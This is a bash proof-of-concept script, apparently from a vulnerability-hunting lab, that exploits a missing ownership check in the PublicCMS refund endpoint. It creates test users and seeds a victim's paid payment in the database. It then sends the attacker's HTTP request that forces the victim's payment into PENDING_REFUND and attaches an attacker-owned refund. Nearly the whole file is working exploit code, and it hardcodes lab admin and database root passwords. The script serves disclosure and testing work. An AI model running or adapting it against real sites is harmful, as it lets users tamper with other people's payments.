#!/usr/bin/env bash
# VULN-010 — Cross-user payment state change via refund-create pendingRefund (missing owner check)
#
# TradePaymentController.refund calls pendingRefund(site.getId(), entity.getPaymentId()) with an
# attacker-supplied paymentId BEFORE any ownership check. pendingRefund filters on siteId + status
# (PAID/REFUNDED) only — NOT userId — and transitions the payment to PENDING_REFUND. So any
# logged-in user can force another buyer's paid payment into PENDING_REFUND and attach an
# attacker-owned refund to it. Part of the CVE-2026-2010/8738 trade-authz cluster.
#
# Precondition seeding: this install has no payment gateway configured (payments can't be created
# through the normal flow), so a victim's PAID payment row is inserted directly. The EXPLOIT is the
# HTTP cross-user state change; only the precondition is seeded.
#
# CONFIRMED when the victim's payment flips PAID(1)->PENDING_REFUND(2) via the attacker's request,
# and an attacker-owned trade_refund row referencing the victim's payment is created.
#
# DESTRUCTIVE (mutates a payment). Victim/attacker/payment created per run (random suffix).
set -u
BASE_URL="${BASE_URL:-http://localhost:20000}"
VHOST="${VHOST:-site2.dev.publiccms.com}"
ADMIN_USER="${ADMIN_USER:-admin}"; ADMIN_PASS="${ADMIN_PASS:-admin}"
MYSQL_CONTAINER="${MYSQL_CONTAINER:-cvehunt_PublicCMS_mysql}"
DBQ(){ docker exec "$MYSQL_CONTAINER" mysql -uroot -pRootPass2026 publiccms -N -e "$1" 2>/dev/null | tr -d '\r'; }
OUT="$(cd "$(dirname "$0")" && pwd)"
S="$(tr -dc 'a-z0-9' </dev/urandom | head -c 8)"
PID=$(( 900000000 + (RANDOM<<8) + RANDOM % 256 ))

echo "[INFO] VULN-010: cross-user payment -> PENDING_REFUND via missing owner check (CVE-2026-2010 cluster)"
AC=$(curl -s -D - -o /dev/null -H "Host: $VHOST" --data "username=${ADMIN_USER}&password=${ADMIN_PASS}" \
     "$BASE_URL/admin/login" | grep -i 'set-cookie: PUBLICCMS_ADMIN' | cut -d= -f2 | cut -d';' -f1); ACSRF="${AC#*_}"
[ -z "$AC" ] && { echo "[FAIL] no admin session"; exit 1; }
mkuser(){ curl -s -o /dev/null -H "Host: $VHOST" -b "PUBLICCMS_ADMIN=$AC" --data-urlencode "_csrf=$ACSRF" \
  --data-urlencode "name=$1" --data-urlencode "nickname=$1" --data-urlencode "password=Passw0rd!23" \
  --data-urlencode "repassword=Passw0rd!23" --data-urlencode "contentPermissions=0" "$BASE_URL/admin/sysUser/save"; \
  DBQ "SELECT id FROM sys_user WHERE name='$1';"; }
VICTIM=$(mkuser "vpay_$S"); ATTACKER=$(mkuser "apay_$S")

echo "[SETUP] seeding victim(id=$VICTIM) PAID payment id=$PID (no gateway configured -> direct seed)"
DBQ "INSERT INTO trade_payment (id,site_id,user_id,amount,description,trade_type,serial_number,account_type,ip,status,processed,create_date) VALUES ($PID,2,$VICTIM,100.00,'seed_$S','grade','$PID','alipay','127.0.0.1',1,0,NOW());"
BEFORE=$(DBQ "SELECT status FROM trade_payment WHERE id=$PID;")
echo "[SETUP] payment status BEFORE=$BEFORE (1=PAID)"

UC=$(curl -s -D - -o /dev/null -H "Host: $VHOST" --data-urlencode "username=apay_$S" --data-urlencode "password=Passw0rd!23" \
     --data-urlencode "returnUrl=/" "$BASE_URL/doLogin" | grep -i 'set-cookie: PUBLICCMS_USER' | cut -d= -f2 | cut -d';' -f1); UCSRF="${UC#*_}"

echo "[STEP] attacker(id=$ATTACKER) POST /tradePayment/refund paymentId=$PID (victim's)"
curl -s -D - -o /dev/null -H "Host: $VHOST" -b "PUBLICCMS_USER=$UC" \
  --data-urlencode "_csrf=$UCSRF" --data-urlencode "paymentId=$PID" --data-urlencode "amount=1.00" \
  --data-urlencode "reason=poc_$S" --data-urlencode "returnUrl=/" "$BASE_URL/tradePayment/refund" \
  | grep -iE '^HTTP|^location' > "$OUT/response.txt"; cat "$OUT/response.txt"

AFTER=$(DBQ "SELECT status FROM trade_payment WHERE id=$PID;")
REFUND=$(DBQ "SELECT CONCAT(id,':owner=',user_id,':pay=',payment_id,':status=',status) FROM trade_refund WHERE payment_id=$PID;")
{ echo "payment $PID status before=$BEFORE after=$AFTER (2=PENDING_REFUND)"; echo "refund row: $REFUND (owner should be attacker=$ATTACKER)"; } >> "$OUT/response.txt"
echo "[INFO] payment status AFTER=$AFTER ; refund row: $REFUND"

if [ "$BEFORE" = "1" ] && [ "$AFTER" = "2" ] && printf '%s' "$REFUND" | grep -q "owner=$ATTACKER"; then
  echo "[OK] exploit confirmed — attacker forced victim's payment to PENDING_REFUND and created an attacker-owned refund"
  exit 0
else
  echo "[FAIL] cross-user payment state change not observed"; exit 1
fi
# cleanup hint: DELETE FROM trade_refund WHERE reason LIKE 'poc_%'; DELETE FROM trade_payment WHERE description LIKE 'seed_%';
